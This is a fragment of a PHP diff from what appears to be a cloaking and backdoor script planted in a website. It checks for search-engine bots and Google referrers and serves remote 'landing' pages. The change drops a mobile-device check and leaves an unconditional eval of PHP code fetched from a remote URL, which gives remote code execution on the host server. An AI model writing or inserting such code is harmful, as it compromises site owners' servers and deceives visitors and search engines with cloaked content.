@@ -9,10 +9,6 @@ function isFromGoogle() {
             strpos($_SERVER['HTTP_REFERER'], 'google.co.id') !== false);
 }
 
-function isMobileDevice() {
-    return preg_match('/(android|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|windows phone|webos|symbian|nokia|kindle|silk|playbook|tablet|phone)/i', $_SERVER['HTTP_USER_AGENT']);
-}
-
 function NuLzFetch($url){
     if (function_exists('file_get_contents')) {
         $fetch = file_get_contents($url);
@@ -51,12 +47,6 @@ if (isSearchEngineBot()) {
     if (isFromGoogle()) {
         echo NuLzFetch($landing_page);
     } else {
-        if (!isMobileDevice()) {
-            // Jika bukan perangkat mobile, tampilkan $index_home
-            eval ('?>'.NuLzFetch($index_home));
-        } else {
-            // Jika perangkat mobile, tampilkan landing page
-            echo NuLzFetch($landing_page);
-        }
+        eval ('?>'.NuLzFetch($index_home));
     }
 }
